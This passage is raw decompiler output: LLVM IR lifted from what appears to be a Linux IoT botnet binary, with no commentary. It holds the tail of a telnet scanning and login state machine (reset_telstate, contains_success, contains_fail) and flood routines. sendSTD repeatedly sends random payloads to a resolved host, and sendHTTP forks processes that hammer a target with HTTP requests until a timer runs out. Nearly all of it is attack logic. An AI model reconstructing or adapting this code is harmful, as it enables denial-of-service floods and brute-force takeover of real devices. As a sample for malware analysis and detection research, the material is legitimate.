  %v0_804b232 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b232 = load i32, i32* @esp, align 4
  %v2_804b232 = inttoptr i32 %v1_804b232 to i32*
  store i32 %v0_804b232, i32* %v2_804b232, align 4
  %v3_804b235 = call i32 @advance_state(i32* %v1_804b090, i32 %stack_var_-624.247)
  store i32 %v3_804b235, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804b23f:                             ; preds = %dec_label_pc_804b10a
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804b258 = load i32, i32* @esp, align 4
  %v2_804b258 = inttoptr i32 %v1_804b258 to i32*
  store i32 %v2_804a4b4, i32* %v2_804b258, align 4
  %v1_804b25b = call i32 @reset_telstate(i32 %stack_var_-628.248)
  store i32 %v1_804b25b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804b265:                             ; preds = %dec_label_pc_804b025
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v1_804a4b6, i32* %eax.global-to-local, align 4
  %v2_804b280 = load i32, i32* %v1_804a4b9, align 4
  store i32 %v2_804b280, i32* %eax.global-to-local, align 4
  %v1_804b282 = add i32 %v2_804b280, 7
  store i32 %v1_804b282, i32* @ebx, align 4
  %v0_804b285 = load i32, i32* @esp, align 4
  %v1_804b285 = inttoptr i32 %v0_804b285 to i32*
  store i32 0, i32* %v1_804b285, align 4
  %v1_804b28c = inttoptr i32 %stack_var_-628.248 to i32*
  %v2_804b28c = call i32 @__GI_time(i32* %v1_804b28c)
  store i32 %v2_804b28c, i32* %eax.global-to-local, align 4
  %v0_804b291 = load i32, i32* @ebx, align 4
  %v7_804b291 = icmp ult i32 %v0_804b291, %v2_804b28c
  %v1_804b293 = icmp eq i1 %v7_804b291, false
  br i1 %v1_804b293, label %dec_label_pc_804b42f, label %dec_label_pc_804b299

dec_label_pc_804b299:                             ; preds = %dec_label_pc_804b265
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804b2b2 = load i32, i32* @esp, align 4
  %v2_804b2b2 = inttoptr i32 %v1_804b2b2 to i32*
  store i32 %v2_804a4b4, i32* %v2_804b2b2, align 4
  %v1_804b2b5 = call i32 @reset_telstate(i32 %stack_var_-628.248)
  store i32 %v1_804b2b5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804b2bf:                             ; preds = %dec_label_pc_804a4ec
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804b2c2 = load i32, i32* @esp, align 4
  %v1_804b2c2 = inttoptr i32 %v0_804b2c2 to i32*
  store i32 0, i32* %v1_804b2c2, align 4
  %v1_804b2c9 = inttoptr i32 %v6_804a502 to i32*
  %v2_804b2c9 = call i32 @__GI_time(i32* %v1_804b2c9)
  %v0_804b2d3 = load i32, i32* @ebx, align 4
  %v2_804b2e3 = mul i32 %v0_804b2d3, 28
  %v1_804b2e7 = add i32 %v2_804b0ac, %v2_804b2e3
  %v2_804b2ea = inttoptr i32 %v1_804b2e7 to i32*
  store i32 %v2_804b2c9, i32* %v2_804b2ea, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804b302 = inttoptr i32 %v2_804a4b4 to i32*
  %v4_804b302 = load i32, i32* %v3_804b302, align 4
  store i32 %v4_804b302, i32* %eax.global-to-local, align 4
  %v0_804b305 = load i32, i32* @esp, align 4
  %v1_804b305 = add i32 %v0_804b305, 12
  %v2_804b305 = inttoptr i32 %v1_804b305 to i32*
  store i32 16384, i32* %v2_804b305, align 4
  %v0_804b30d = load i32, i32* @esp, align 4
  %v1_804b30d = add i32 %v0_804b30d, 8
  %v2_804b30d = inttoptr i32 %v1_804b30d to i32*
  store i32 4, i32* %v2_804b30d, align 4
  %v0_804b315 = load i32, i32* @esp, align 4
  %v1_804b315 = add i32 %v0_804b315, 4
  %v2_804b315 = inttoptr i32 %v1_804b315 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8056799.60 to i32), i32* %v2_804b315, align 4
  %v0_804b31d = load i32, i32* %eax.global-to-local, align 4
  %v1_804b31d = load i32, i32* @esp, align 4
  %v2_804b31d = inttoptr i32 %v1_804b31d to i32*
  store i32 %v0_804b31d, i32* %v2_804b31d, align 4
  %v4_804b320 = call i32 @__libc_send(i32 %stack_var_-628.248, i32 %stack_var_-624.247, i32 %v2_804a3bd, i32 %v6_804a502)
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804b33b = load i32, i32* %v3_804b302, align 4
  store i32 %v4_804b33b, i32* %eax.global-to-local, align 4
  %v0_804b33e = load i32, i32* @esp, align 4
  %v1_804b33e = add i32 %v0_804b33e, 12
  %v2_804b33e = inttoptr i32 %v1_804b33e to i32*
  store i32 16384, i32* %v2_804b33e, align 4
  %v0_804b346 = load i32, i32* @esp, align 4
  %v1_804b346 = add i32 %v0_804b346, 8
  %v2_804b346 = inttoptr i32 %v1_804b346 to i32*
  store i32 7, i32* %v2_804b346, align 4
  %v0_804b34e = load i32, i32* @esp, align 4
  %v1_804b34e = add i32 %v0_804b34e, 4
  %v2_804b34e = inttoptr i32 %v1_804b34e to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_805679e.61 to i32), i32* %v2_804b34e, align 4
  %v0_804b356 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b356 = load i32, i32* @esp, align 4
  %v2_804b356 = inttoptr i32 %v1_804b356 to i32*
  store i32 %v0_804b356, i32* %v2_804b356, align 4
  %v4_804b359 = call i32 @__libc_send(i32 %stack_var_-628.248, i32 %stack_var_-624.247, i32 %v2_804a3bd, i32 %v6_804a502)
  %v0_804b35e = load i32, i32* bitcast ([443 x i8]** @global_var_8059794.63 to i32*), align 4
  %v5_804b368 = inttoptr i32 %v0_804b35e to i8*
  %v1_804b36e = and i32 %v0_804b35e, -256
  store i32 %v1_804b36e, i32* %eax.global-to-local, align 4
  store i32 %v0_804b35e, i32* @edi, align 4
  %v3_804b377 = call i32 @_strlen(i8* %v5_804b368)
  store i32 %v3_804b377, i32* @ebx, align 4
  %v0_804b380 = load i32, i32* bitcast ([443 x i8]** @global_var_8059794.63 to i32*), align 4
  store i32 %v0_804b380, i32* @esi, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804b39c = load i32, i32* %v3_804b302, align 4
  store i32 %v4_804b39c, i32* %eax.global-to-local, align 4
  %v0_804b39f = load i32, i32* @esp, align 4
  %v1_804b39f = add i32 %v0_804b39f, 12
  %v2_804b39f = inttoptr i32 %v1_804b39f to i32*
  store i32 16384, i32* %v2_804b39f, align 4
  %v0_804b3a7 = load i32, i32* @ebx, align 4
  %v1_804b3a7 = load i32, i32* @esp, align 4
  %v2_804b3a7 = add i32 %v1_804b3a7, 8
  %v3_804b3a7 = inttoptr i32 %v2_804b3a7 to i32*
  store i32 %v0_804b3a7, i32* %v3_804b3a7, align 4
  %v0_804b3ab = load i32, i32* @esi, align 4
  %v1_804b3ab = load i32, i32* @esp, align 4
  %v2_804b3ab = add i32 %v1_804b3ab, 4
  %v3_804b3ab = inttoptr i32 %v2_804b3ab to i32*
  store i32 %v0_804b3ab, i32* %v3_804b3ab, align 4
  %v0_804b3af = load i32, i32* %eax.global-to-local, align 4
  %v1_804b3af = load i32, i32* @esp, align 4
  %v2_804b3af = inttoptr i32 %v1_804b3af to i32*
  store i32 %v0_804b3af, i32* %v2_804b3af, align 4
  %v5_804b3b2 = call i32 @__libc_send(i32 %v0_804b35e, i32 %stack_var_-628.248, i32 %stack_var_-624.247, i32 %v2_804a3bd)
  store i32 %v5_804b3b2, i32* %eax.global-to-local, align 4
  %v2_804b3b7 = icmp slt i32 %v5_804b3b2, 0
  %v1_804b3b9 = icmp eq i1 %v2_804b3b7, false
  store i32 %v1_804a4a4, i32* @edx, align 4
  br i1 %v1_804b3b9, label %dec_label_pc_804b3de, label %dec_label_pc_804b3bb

dec_label_pc_804b3bb:                             ; preds = %dec_label_pc_804b2bf
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804b3d4 = load i32, i32* @esp, align 4
  %v2_804b3d4 = inttoptr i32 %v1_804b3d4 to i32*
  store i32 %v2_804a4b4, i32* %v2_804b3d4, align 4
  %v2_804b3d7 = call i32 @reset_telstate(i32 %v0_804b35e)
  store i32 %v2_804b3d7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804b3de:                             ; preds = %dec_label_pc_804b2bf
  store i32 %v1_804a4b6, i32* %eax.global-to-local, align 4
  %v2_804b3f9 = load i32, i32* %v1_804a4b9, align 4
  store i32 %v2_804b3f9, i32* %eax.global-to-local, align 4
  %v1_804b3fb = add i32 %v2_804b3f9, 25
  store i32 %v1_804b3fb, i32* @ebx, align 4
  %v0_804b3fe = load i32, i32* @esp, align 4
  %v1_804b3fe = inttoptr i32 %v0_804b3fe to i32*
  store i32 0, i32* %v1_804b3fe, align 4
  %tmp38 = inttoptr i32 %v0_804b35e to i32*
  %v3_804b405 = call i32 @__GI_time(i32* %tmp38)
  store i32 %v3_804b405, i32* %eax.global-to-local, align 4
  %v0_804b40a = load i32, i32* @ebx, align 4
  %v7_804b40a = icmp ult i32 %v0_804b40a, %v3_804b405
  %v1_804b40c = icmp eq i1 %v7_804b40a, false
  br i1 %v1_804b40c, label %dec_label_pc_804b42f, label %dec_label_pc_804b40e

dec_label_pc_804b40e:                             ; preds = %dec_label_pc_804b3de
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804b427 = load i32, i32* @esp, align 4
  %v2_804b427 = inttoptr i32 %v1_804b427 to i32*
  store i32 %v2_804a4b4, i32* %v2_804b427, align 4
  %v2_804b42a = call i32 @reset_telstate(i32 %v0_804b35e)
  store i32 %v2_804b42a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804b42f:                             ; preds = %dec_label_pc_804a4ec, %dec_label_pc_804b3de, %dec_label_pc_804b265, %dec_label_pc_804ae78, %dec_label_pc_804abe5, %dec_label_pc_804aaa5, %dec_label_pc_804a6e8, %dec_label_pc_804b3bb, %dec_label_pc_804b299, %dec_label_pc_804b23f, %dec_label_pc_804b184, %dec_label_pc_804b156, %dec_label_pc_804b0dc, %dec_label_pc_804aff7, %dec_label_pc_804afd1, %dec_label_pc_804af6e, %dec_label_pc_804aeac, %dec_label_pc_804ae4a, %dec_label_pc_804ae1c, %dec_label_pc_804ad64, %dec_label_pc_804ad3e, %dec_label_pc_804acdb, %dec_label_pc_804ac19, %dec_label_pc_804abb7, %dec_label_pc_804ab89, %dec_label_pc_804aad9, %dec_label_pc_804aa7f, %dec_label_pc_804a9e5, %dec_label_pc_804a9bf, %dec_label_pc_804a86b, %dec_label_pc_804a845, %dec_label_pc_804a6c8, %dec_label_pc_804b40e
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.247, %dec_label_pc_804a4ec ], [ %stack_var_-624.247, %dec_label_pc_804b3de ], [ %stack_var_-624.247, %dec_label_pc_804b40e ], [ %stack_var_-624.247, %dec_label_pc_804b3bb ], [ %stack_var_-624.247, %dec_label_pc_804b265 ], [ %stack_var_-624.247, %dec_label_pc_804b299 ], [ %stack_var_-624.247, %dec_label_pc_804b23f ], [ %stack_var_-624.247, %dec_label_pc_804b184 ], [ %stack_var_-624.247, %dec_label_pc_804b156 ], [ %stack_var_-624.247, %dec_label_pc_804b0dc ], [ %stack_var_-624.247, %dec_label_pc_804aff7 ], [ %stack_var_-624.247, %dec_label_pc_804afd1 ], [ %stack_var_-624.247, %dec_label_pc_804af6e ], [ %stack_var_-624.247, %dec_label_pc_804ae78 ], [ %stack_var_-624.247, %dec_label_pc_804aeac ], [ %stack_var_-624.247, %dec_label_pc_804ae4a ], [ %stack_var_-624.247, %dec_label_pc_804ae1c ], [ %v4_804ac5d, %dec_label_pc_804ad64 ], [ %v4_804ac5d, %dec_label_pc_804ad3e ], [ %v4_804ac5d, %dec_label_pc_804acdb ], [ %stack_var_-624.247, %dec_label_pc_804abe5 ], [ %stack_var_-624.247, %dec_label_pc_804ac19 ], [ %stack_var_-624.247, %dec_label_pc_804abb7 ], [ %stack_var_-624.247, %dec_label_pc_804ab89 ], [ %stack_var_-624.247, %dec_label_pc_804aaa5 ], [ %stack_var_-624.247, %dec_label_pc_804aad9 ], [ %stack_var_-624.247, %dec_label_pc_804aa7f ], [ %stack_var_-624.247, %dec_label_pc_804a9e5 ], [ %stack_var_-624.247, %dec_label_pc_804a9bf ], [ %stack_var_-624.247, %dec_label_pc_804a6e8 ], [ %stack_var_-624.247, %dec_label_pc_804a86b ], [ %stack_var_-624.247, %dec_label_pc_804a845 ], [ %stack_var_-624.247, %dec_label_pc_804a6c8 ]
  %stack_var_-628.1 = phi i32 [ %stack_var_-628.248, %dec_label_pc_804a4ec ], [ %stack_var_-628.248, %dec_label_pc_804b3de ], [ %stack_var_-628.248, %dec_label_pc_804b40e ], [ %stack_var_-628.248, %dec_label_pc_804b3bb ], [ %stack_var_-628.248, %dec_label_pc_804b265 ], [ %stack_var_-628.248, %dec_label_pc_804b299 ], [ %stack_var_-628.248, %dec_label_pc_804b23f ], [ %stack_var_-628.248, %dec_label_pc_804b184 ], [ %stack_var_-628.248, %dec_label_pc_804b156 ], [ %stack_var_-628.248, %dec_label_pc_804b0dc ], [ %v4_804aef0, %dec_label_pc_804aff7 ], [ %v4_804aef0, %dec_label_pc_804afd1 ], [ %v4_804aef0, %dec_label_pc_804af6e ], [ %stack_var_-628.248, %dec_label_pc_804ae78 ], [ %stack_var_-628.248, %dec_label_pc_804aeac ], [ %stack_var_-628.248, %dec_label_pc_804ae4a ], [ %stack_var_-628.248, %dec_label_pc_804ae1c ], [ %stack_var_-628.248, %dec_label_pc_804ad64 ], [ %stack_var_-628.248, %dec_label_pc_804ad3e ], [ %stack_var_-628.248, %dec_label_pc_804acdb ], [ %stack_var_-628.248, %dec_label_pc_804abe5 ], [ %stack_var_-628.248, %dec_label_pc_804ac19 ], [ %stack_var_-628.248, %dec_label_pc_804abb7 ], [ %stack_var_-628.248, %dec_label_pc_804ab89 ], [ %stack_var_-628.248, %dec_label_pc_804aaa5 ], [ %stack_var_-628.248, %dec_label_pc_804aad9 ], [ %stack_var_-628.248, %dec_label_pc_804aa7f ], [ %stack_var_-628.248, %dec_label_pc_804a9e5 ], [ %stack_var_-628.248, %dec_label_pc_804a9bf ], [ %stack_var_-628.248, %dec_label_pc_804a6e8 ], [ %stack_var_-628.248, %dec_label_pc_804a86b ], [ %stack_var_-628.248, %dec_label_pc_804a845 ], [ %stack_var_-628.248, %dec_label_pc_804a6c8 ]
  %v4_804b42f = add nuw nsw i32 %storemerge49, 1
  store i32 %v4_804b42f, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804b42f, %arg2
  br i1 %exitcond, label %dec_label_pc_804a492, label %dec_label_pc_804a49e

; uselistorder directives
  uselistorder i32 %v4_804b42f, { 1, 2, 0 }
  uselistorder i32 %stack_var_-628.1, { 1, 0 }
  uselistorder i32 %stack_var_-624.1, { 1, 0 }
  uselistorder i32* %v1_804b090, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804b010, { 1, 0 }
  uselistorder i32 %v4_804aef0, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804ae63, { 1, 0 }
  uselistorder i32 %v0_804ad7d, { 1, 0 }
  uselistorder i32 %v4_804ac5d, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804abd0, { 1, 0 }
  uselistorder i32 %v5_804a94a, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_804a8e9, { 1, 0 }
  uselistorder i32 %v2_804a8cd, { 1, 0 }
  uselistorder i32 %v2_804a738, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v2_804a56a, { 1, 0 }
  uselistorder i32 %v6_804a502, { 8, 9, 10, 7, 5, 6, 4, 2, 3, 1, 0, 12, 11, 13 }
  uselistorder i32* %v1_804a4b9, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_804a4b6, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v2_804a4b4, { 50, 49, 52, 51, 53, 39, 38, 41, 40, 42, 44, 43, 45, 46, 47, 48, 34, 33, 36, 35, 37, 28, 27, 29, 30, 31, 32, 23, 22, 25, 24, 26, 17, 16, 18, 19, 20, 21, 9, 8, 11, 10, 12, 14, 13, 15, 0, 2, 1, 3, 4, 6, 5, 7, 54 }
  uselistorder i32 %v2_804a4b2, { 10, 11, 12, 1, 13, 0, 14, 2, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 4, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 6, 39, 5, 40, 41, 7, 42, 8, 43, 9 }
  uselistorder i32 %v1_804a4a4, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 40, 41, 36, 37, 38, 39, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i32 %stack_var_-624.247, { 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 29, 26, 24, 22, 21, 20, 16, 14, 12, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1, 11, 10, 13, 15, 19, 18, 17, 25, 23, 28, 30, 27 }
  uselistorder i32 %stack_var_-628.248, { 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 15, 10, 8, 6, 5, 4, 0, 3, 2, 1, 9, 7, 14, 16, 13, 12, 11 }
  uselistorder i32 %storemerge49, { 2, 3, 4, 5, 6, 8, 7, 0, 1 }
  uselistorder i32 %v4_804a481, { 1, 2, 0 }
  uselistorder i32 %storemerge259, { 1, 0 }
  uselistorder i32 %v2_804a3da, { 1, 0 }
  uselistorder i32 %v2_804a3bd, { 14, 13, 12, 16, 15, 17, 18, 21, 20, 19, 5, 6, 7, 8, 22, 1, 2, 3, 4, 9, 0, 10, 11 }
  uselistorder i32* %stack_var_-604, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-596, { 4, 0, 2, 1, 3, 5, 6, 7 }
  uselistorder i32* %stack_var_-316, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-324, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-328, { 4, 3, 5, 1, 0, 2, 6, 7 }
  uselistorder i32* %stack_var_-332, { 6, 0, 9, 8, 4, 7, 10, 2, 1, 5, 11, 3, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 44, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67 }
  uselistorder i32* %eax.global-to-local, { 198, 2, 1, 5, 3, 4, 7, 6, 10, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 23, 21, 22, 25, 24, 28, 26, 27, 30, 29, 31, 32, 33, 34, 37, 35, 36, 38, 39, 42, 40, 41, 45, 43, 44, 48, 46, 47, 50, 49, 51, 52, 55, 53, 56, 54, 57, 58, 59, 61, 60, 64, 62, 63, 65, 66, 67, 68, 69, 70, 72, 71, 75, 73, 74, 80, 77, 81, 78, 79, 82, 83, 76, 84, 85, 86, 89, 87, 90, 88, 91, 92, 93, 95, 94, 98, 96, 97, 99, 100, 101, 102, 103, 104, 106, 105, 109, 107, 108, 114, 111, 115, 112, 113, 116, 117, 110, 118, 119, 120, 122, 121, 125, 123, 124, 127, 126, 130, 128, 129, 131, 132, 133, 134, 135, 136, 138, 137, 139, 140, 141, 143, 142, 144, 145, 146, 147, 148, 151, 149, 150, 153, 152, 154, 155, 158, 156, 157, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 176, 191, 192, 193, 194, 195, 196, 197, 0, 199, 200, 213, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 220, 214, 215, 216, 217, 219, 218 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 7, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg1, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804b42f, { 32, 1, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 22, 4, 23, 24, 25, 5, 26, 27, 28, 29, 30, 6, 31, 0 }
  uselistorder label %dec_label_pc_804a4ec, { 1, 0 }
  uselistorder label %dec_label_pc_804a49e, { 1, 0 }
  uselistorder label %dec_label_pc_804a492, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804a481, { 2, 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b443 = load i32, i32* @ebp, align 4
  store i32 %v0_804b443, i32* %stack_var_-4, align 4
  %v4_804b443 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804b443, i32* @ebp, align 4
  %v4_804b463 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804b472 = call i32 @__GI_time(i32* null)
  %v1_804b480 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_804b488 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_804b4a9 = add i32 %v1_804b480, 12
  %v2_804b4a9 = inttoptr i32 %v1_804b4a9 to i32*
  %v3_804b4a9 = load i32, i32* %v2_804b4a9, align 4
  %v2_804b4b1 = ptrtoint i32* %stack_var_-36 to i32
  %v1_804b4b7 = add i32 %v1_804b480, 16
  %v2_804b4b7 = inttoptr i32 %v1_804b4b7 to i32*
  %v3_804b4b7 = load i32, i32* %v2_804b4b7, align 4
  %v1_804b4ba = inttoptr i32 %v3_804b4b7 to i32*
  %v2_804b4ba = load i32, i32* %v1_804b4ba, align 4
  %v4_804b4c7 = call i32 @bcopy(i32 %v2_804b4ba, i32 %v2_804b4b1, i32 %v3_804b4a9)
  %v1_804b4cf = add i32 %v1_804b480, 8
  %v2_804b4cf = inttoptr i32 %v1_804b4cf to i32*
  %v3_804b4cf = load i32, i32* %v2_804b4cf, align 4
  %v1_804b4d2 = urem i32 %v3_804b4cf, 65536
  store i32 %v1_804b4d2, i32* %stack_var_-40, align 4
  %v4_804b505 = bitcast i32* %stack_var_-184 to i16*
  %v5_804b5ad = add i32 %v2_804b472, %arg3
  br label %dec_label_pc_804b4ea

dec_label_pc_804b4ea:                             ; preds = %dec_label_pc_804b5d2, %entry
  %storemerge = phi i32 [ %v4_804b5d2, %dec_label_pc_804b5d2 ], [ 0, %entry ]
  %v5_804b505 = call i32 @memcpy(i16* %v4_804b505, i32 ptrtoint ([36 x i8*]* @global_var_8056960.100 to i32), i32 144)
  store i32 %v5_804b505, i32* @eax, align 4
  %v0_804b50a = call i32 @random()
  %tmp = icmp ult i32 %storemerge, 50
  br i1 %tmp, label %dec_label_pc_804b5d2, label %dec_label_pc_804b560

dec_label_pc_804b560:                             ; preds = %dec_label_pc_804b4ea
  %v0_804b550 = load i32, i32* @ebp, align 4
  %v3_804b550 = add i32 %v0_804b550, -180
  %v2_804b525 = udiv i32 %v0_804b50a, 36
  %tmp29 = mul nsw i32 %v2_804b525, -4
  %v2_804b542 = add i32 %v0_804b50a, %tmp29
  %v2_804b550 = mul i32 %v2_804b542, 4
  %v4_804b550 = add i32 %v3_804b550, %v2_804b550
  %v5_804b550 = inttoptr i32 %v4_804b550 to i32*
  %v6_804b550 = load i32, i32* %v5_804b550, align 4
  %v5_804b57d = call i32 @__libc_send(i32 %v4_804b463, i32 %v6_804b550, i32 65, i32 0)
  %v4_804b597 = call i32 @__libc_connect(i32 %v4_804b463, i32 %v2_804b488, i32 16)
  %v2_804b5a3 = call i32 @__GI_time(i32* null)
  %v5_804b5b2 = icmp slt i32 %v2_804b5a3, %v5_804b5ad
  br i1 %v5_804b5b2, label %dec_label_pc_804b5d2, label %dec_label_pc_804b5b4

dec_label_pc_804b5b4:                             ; preds = %dec_label_pc_804b560
  %v1_804b5ba = call i32 @__libc_close(i32 %v4_804b463)
  %v1_804b5c6 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804b5d2:                             ; preds = %dec_label_pc_804b560, %dec_label_pc_804b4ea
  %stack_var_-12.0 = phi i32 [ %storemerge, %dec_label_pc_804b4ea ], [ 0, %dec_label_pc_804b560 ]
  %v4_804b5d2 = add i32 %stack_var_-12.0, 1
  br label %dec_label_pc_804b4ea

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_804b480, { 1, 0, 2 }
  uselistorder i32 %v4_804b463, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-541 = alloca i32, align 4
  %stack_var_-540 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804b5dd = load i32, i32* @edi, align 4
  %v0_804b5de = load i32, i32* @ebx, align 4
  store i32 %v0_804b5de, i32* %stack_var_-12, align 4
  %v2_804b5f6 = call i32 @__GI_time(i32* null)
  %v5_804b5fb = add i32 %v2_804b5f6, %arg5
  %v2_804b689 = ptrtoint i32* %stack_var_-540 to i32
  %v4_804b6dc = bitcast i32* %stack_var_-540 to i8*
  store i32 0, i32* @eax, align 4
  %v5_804b75434 = icmp sgt i32 %arg6, 0
  br i1 %v5_804b75434, label %dec_label_pc_804b614, label %dec_label_pc_804b75a

dec_label_pc_804b614:                             ; preds = %entry, %dec_label_pc_804b74b
  %storemerge35 = phi i32 [ %v4_804b74b, %dec_label_pc_804b74b ], [ 0, %entry ]
  %v0_804b614 = call i32 @random()
  %v2_804b637 = sdiv i32 %v0_804b614, 36
  store i32 %v2_804b637, i32* @ebx, align 4
  %tmp = mul i32 %v2_804b637, -36
  %v2_804b653 = add i32 %v0_804b614, %tmp
  store i32 %v2_804b653, i32* @edi, align 4
  %v5_804b692 = call i32 @sprintf(i32 %v2_804b689, i32 ptrtoint ([64 x i8]* @global_var_80569f0.101 to i32), i32 %arg1, i32 %arg4)
  %v1_804b697 = call i32 @__libc_fork(i32 %v2_804b689)
  %v1_804b69c = icmp eq i32 %v1_804b697, 0
  br i1 %v1_804b69c, label %dec_label_pc_804b74b, label %dec_label_pc_804b72a

dec_label_pc_804b6a9:                             ; preds = %dec_label_pc_804b72a
  %v4_804b6ba = call i32 @socket_connect(i32 %arg2, i16 %arg3)
  %v4_804b6c2 = icmp eq i32 %v4_804b6ba, 0
  br i1 %v4_804b6c2, label %dec_label_pc_804b72a, label %dec_label_pc_804b6c8

dec_label_pc_804b6c8:                             ; preds = %dec_label_pc_804b6a9
  store i1 false, i1* @df, align 1
  store i32 %v2_804b689, i32* @edi, align 4
  %v3_804b6e2 = call i32 @_strlen(i8* %v4_804b6dc)
  %v5_804b6fd = call i32 @__libc_write(i32 %v4_804b6ba, i32* nonnull %stack_var_-540, i32 %v3_804b6e2)
  %v5_804b71a = call i32 @__libc_read(i32 %v4_804b6ba, i32* nonnull %stack_var_-541, i32 1)
  %v1_804b725 = call i32 @__libc_close(i32 %v4_804b6ba)
  br label %dec_label_pc_804b72a

dec_label_pc_804b72a:                             ; preds = %dec_label_pc_804b6a9, %dec_label_pc_804b6c8, %dec_label_pc_804b614
  %v2_804b731 = call i32 @__GI_time(i32* null)
  store i32 %v2_804b731, i32* @eax, align 4
  %v5_804b739 = icmp slt i32 %v2_804b731, %v5_804b5fb
  br i1 %v5_804b739, label %dec_label_pc_804b6a9, label %dec_label_pc_804b73f

dec_label_pc_804b73f:                             ; preds = %dec_label_pc_804b72a
  %v1_804b746 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804b74b

